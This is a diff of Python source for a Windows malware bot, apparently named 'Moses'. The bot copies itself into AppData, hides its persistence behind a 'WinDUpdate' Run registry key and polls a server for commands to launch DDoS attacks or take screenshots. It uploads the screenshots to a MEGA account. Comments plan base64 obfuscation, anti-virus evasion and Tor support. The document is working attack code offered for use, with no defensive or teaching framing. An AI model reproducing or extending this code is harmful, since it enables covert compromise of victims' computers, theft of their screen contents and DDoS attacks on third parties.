@@ -3,15 +3,15 @@ from mega import Mega
 from datetime import datetime
 #exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))
 
-# TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
 # TODO: obfuscate all function and variable names after completion
-# TODO: check anti-virus evasion/efficacy
 # TODO: setup tor capability
-# TODO: convert to subprocesses in the future
+# TODO: change os.system to subprocess
 
+# TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
+# TODO: Check anti-virus evasion/efficacy again
 # NOTE: READ INSTRUCTIONS BELOW
 #
-# 1) Make the required changes to Moses (Variable of URL of web server and master_filename variable if changing the master_filename of the moses.? file)
+# 1) Make the required changes to Moses (Variable of URL of web server and master_filename variable if changing the master_filename of the moses.exe file)
 # 2) Go to https://www.base64encode.org/ and encode the entirety of the code BELOW (don't copy this comment block)
 # 3) Copy the output of the base64 encoder website with the contents of your encoded program
 # 4) Find the box above that says "BASE64 ENCODED PROGRAM GOES HERE" and replace it with the copied code
@@ -20,15 +20,15 @@ from datetime import datetime
 #
 
 def main():
-    URL = "URLTOWEBSITE" #NO SLASH AT THE END OF THE URL
+    URL = "https://website.tld" #NO SLASH AT THE END OF THE URL
     master_filename = "moses.exe"
 
     sys_username = get_sys_username()
 
-    # TODO: find more paths to store moses.exe in
-    path = ["\\AppData\\Roaming\\", "\\AppData\\local"]
+    path = ["\\AppData\\Roaming\\", "\\AppData\\Local\\"] # TODO: add more paths to store moses.exe
 
     for x in path:
+        # this is fucky so it won't trigger av (as of now, it works...)
         try:
             shutil.copyfile(master_filename, "C:\\Users\\" + sys_username + x + master_filename)
         except:
@@ -45,12 +45,11 @@ def main():
 
     for x in path:
         if (check_if_file_exists_in_path(x, sys_username, master_filename)):
-            # NOTE: i'm not sure if this will create duplicate entries in the registry, or replace if there's a pre-existing entry, so be sure to bug fix this
             os.system('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + sys_username + x + master_filename + '"')
-            #NOTE: this isn't needed, but i'll keep it here for now
-            # path reassigned to x (the other paths aren't needed during this session)
-            path = x 
-            # persistence initiated, so break
+
+            # NOTE: this isn't needed, but i'll keep it here incase I do later (not sure why i put it here to being with)
+            path = x
+            # it's now persistent, so break
             break
         else:
             pass
@@ -66,9 +65,11 @@ def main():
             ddos_attack(target, stop_time)
         elif (signal == "2"): # screenshot
             take_screenshot(sys_username)
+        # TODO
+        #elif (signal == "3"):
+        #    download_file()
         else:
-            # command not recognized, or page is empty
-            pass
+            pass # command not recognized, or page is empty
 
         time.sleep(6)
 
@@ -108,9 +109,10 @@ def upload_file(filename):
 
     while (True):
         try: 
+            #TODO: create a mega login function instead, as it'll cut down on redundancy
             mega = Mega()
             #TODO: find a better way than plaintext email and password...
-            m = mega.login("EMAIL", "PASSWORD")
+            m = mega.login("USERNAME", "PASSWORD")
 
             m.upload(filename)
 
@@ -129,6 +131,11 @@ def upload_file(filename):
 #TODO: COMPLETE FUNCTION
 # downloads file to root (master file's) dir from the root mega folder
 def download_file(filename):
+    #TODO: create a mega login function instead, as it'll cut down on redundancy
+    mega = Mega()
+    #TODO: find a better way than plaintext email and password...
+    m = mega.login("USERNAME", "PASSWORD")
+
     filename = m.find(filename)
     m.download(filename)
 
@@ -152,7 +159,6 @@ def ddos_attack(target, stop_time): # 1
         except:
             pass
 
-# NOTE: THIS MAY NOT WORK, BUG CHECK THIS
 def take_screenshot(sys_username): # 2
     filename = get_current_time()
     # example: 1357rethyxyz.png
@@ -163,15 +169,5 @@ def take_screenshot(sys_username): # 2
     screenshot.save(filename)
 
     upload_file(filename)
-
-# NOTE: i may omit this function and opt for screen cap. every second for x amount of time
-#def take_webcam_snapshot():
-#    try:
-#        video_capture = cv2.VideoCapture(0)
-#        # Read picture. ret === True on success
-#        ret, frame = video_capture.read()
-#        # Close device
-#        video_capture.release()
-#    except:
 
 main()
